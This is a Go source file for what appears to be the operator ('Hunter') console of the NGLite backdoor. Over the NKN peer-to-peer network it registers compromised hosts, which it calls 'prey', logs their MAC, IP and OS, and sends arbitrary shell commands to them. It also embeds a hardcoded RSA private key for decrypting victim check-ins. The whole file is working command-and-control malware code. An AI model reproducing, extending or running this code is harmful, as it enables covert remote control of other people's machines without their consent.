package main

import (
	"NGLite/internal/config"
	"NGLite/internal/core"
	"NGLite/internal/logger"
	"NGLite/internal/transport"
	"NGLite/module/cipher"
	"bufio"
	"flag"
	"fmt"
	"os"
	"strings"
	"time"

	nkn "github.com/nknorg/nkn-sdk-go"
)

const (
	RsaPrivateKey = `-----BEGIN PRIVATE KEY-----
MIIEowIBAAKCAQEAximut2j7W5ISBb//heyfumaN5pscUWhgJSAw/dHrlKqFhwU0
pB1wRmMrW7UCEJG0KLMBrXqvak5GWAv4nU/ev9kJohatyFvZYfEEWrlcqHCmJFW5
QcGNnRG52TG8bU6Xk7ide1PTmPmrUlXAEwysg4iYeWxCOpO9c4P7CLw/XyoHZ/yP
Xf/xPJNxxMpaudux1WAZBg+a1j1bilS5MBi60QMmE62OvKl2QpfTqFTDllh+UTou
Nzwt4fnEH5cQnhXxdDH7RGtj1Rnm7w1jwWr4mqGPzuE5KeNlPNPtN770fbSv0qOR
G7HZ4sJFv59Rs9fY7j64dJfNY5sf1Z31reoJIwIDAQABAoIBAHdw/FyUrJz/KFnK
5muEuqoR0oojCCiRbxIxmxYCh6quNZmyq44YKGpkr+ew7LOr/xlg/CvifQTodUHw
xUOctriQS1wlq03O/vIn4eYFQDJO4/WWrflSftcjrg+aCOchrf9eEZ4aYrocEwWn
pgRVaU5G8RCPDkRcdJ7B+HfFb7UdgoHr5/1oeMOCs4pxnq8riBZd9Z3GAcPUkSWq
7Fx/sqHftBZjV7FbA7erRcv4xypAjIp7WvohbYmydDErkDS3rd9Dte+6IG8n3qoS
nwACJFD9byFXdpai7BhfsEAlAh/7dsrivCsnDq0xY9Ee4JRdz6bAXzO3EamlaKAq
5d7tYqECgYEA6AGW7/WnJ27qtGKZZGKIIoE/OPTpJNsEYGQqYiEsrDITYDZZRG+q
B/whtTHm38CEmf4DSx14IB433w/hUBfTrTJCJjM2sRGRftrgh2xPdqK3hVr3Dy50
FeFETTLJlVQOw176CjMcX6+hhas88YhD6lRfNe61SNf7dHXzTMRsJvkCgYEA2qgV
HsU865SvNrHOMHe9y8tIL+x41VbU1c5MwJfvtHONgAPhS+P3m6yrGHdly3LAuteM
95HqRBq6bgN9LgHfRt6hKXZbILGeRgeYKTB1UJ39Z4KpMGkNYdG34Qjgq7FycvMd
SoWxlCWR5YI9h0eSZwjSfzefUSzD9aHTFgj0K/sCgYEAriTDTsps9URkF5IK4Ta0
SHILKo1qkqdy2YdV6OJNzdKoiIdC6gOG9QdjpcYXLcwrvArWHgO4ryL/fQdGb//y
ewZGcLXwT2iIdVeFQSEjZEEuz4I//702lVXJFskQVm4Jxsv7krxah9gkvViTHhjS
IYnDDZBnso2ryPbf8LdfFsECgYBRmRIwpniCjb0JUzdYHQdmKxloUP4S11Gb7F32
LX0VwV2X3VrRYGSB4uECw2PolY1Y7KG9reVXvwW9km2/opE5OFG6UGHXhJFFHwZo
sJ3HFP6BB2CuITYOQB43y4FUcWb9gL54lgXb/F1C4eSmPE5lRwSO1yoMOAF1BAvr
GDJOywKBgCnPnjckt+8nJXmTLkJlU0Klsee0aK5SQ2gXYc4af4U0TJXEhhsDymfN
UcokpJbmBeAiE2b8jnJox96cyVC8wNX395WgWtcTXC0vL/BeSUgfeJMnbQGnDD9j
RFDgdjmKGI/BamxEpmM2wPGhQtGYg6iXGVtCYjCWCjufoq8WS8Y8
-----END PRIVATE KEY-----`
)

func main() {
	var seedFlag string
	var makeSeedFlag string
	flag.StringVar(&seedFlag, "g", "", "group seed")
	flag.StringVar(&makeSeedFlag, "n", "", "-n new to make a new seed")
	flag.Parse()

	if makeSeedFlag == "new" {
		seed, err := config.GenerateNewSeed()
		if err != nil {
			fmt.Println("Error:", err)
			os.Exit(1)
		}
		fmt.Println(seed)
		os.Exit(0)
	}

	cfg := config.DefaultConfig()
	if seedFlag != "" {
		cfg.SeedID = seedFlag
	}

	log := logger.NewLogger()
	log.SetOnLog(func(entry logger.LogEntry) {
		fmt.Println(entry.String())
	})

	tm, err := transport.NewTransportManager(cfg.SeedID, cfg.TransThreads)
	if err != nil {
		log.Error(fmt.Sprintf("Failed to create transport: %v", err))
		os.Exit(1)
	}

	sessionMgr := core.NewSessionManager()
	sessionMgr.SetOnAdd(func(s *core.Session) {
		log.Info(fmt.Sprintf("New client added: %s", s.PreyID))
	})

	dispatcher := core.NewCommandDispatcher(tm, cfg.AESKey)

	listener := transport.NewListener(tm)
	go func() {
		err := listener.Start(cfg.HunterID, func(msg *nkn.Message) {
			preyID := string(rsaDecode(msg.Data))
			mac, ip, os := core.ParsePreyID(preyID)
			now := time.Now()
			session := &core.Session{
				PreyID:    preyID,
				MAC:       mac,
				IP:        ip,
				OS:        os,
				Status:    core.StatusOnline,
				LastSeen:  now,
				CreatedAt: now,
			}
			sessionMgr.AddSession(session)
			msg.Reply([]byte("OK"))
		})
		if err != nil {
			log.Error(fmt.Sprintf("Listener error: %v", err))
		}
	}()

	log.Info("NGLite Hunter CLI started")
	fmt.Println("Usage: <preyid> <command>")
	fmt.Println("Example: aa:bb:cc:dd:ee:ff192.168.1.100 whoami")

	inputReader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("> ")
		inputText, err := inputReader.ReadString('\n')
		if err != nil {
			log.Error(fmt.Sprintf("Read error: %v", err))
			continue
		}

		strArray := strings.Fields(strings.TrimSpace(inputText))
		if len(strArray) < 2 {
			fmt.Println("Invalid command. Usage: <preyid> <command>")
			continue
		}

		preyID := strArray[0]
		command := strings.Join(strArray[1:], " ")

		result, err := dispatcher.SendCommand(preyID, command)
		if err != nil {
			log.Error(fmt.Sprintf("Command failed: %v", err))
		} else {
			fmt.Println(result)
		}
	}
}

func rsaDecode(data []byte) []byte {
	plaintext, err := cipher.RsaDecrypt(data, []byte(RsaPrivateKey))
	if err != nil {
		return data
	}
	return plaintext
}

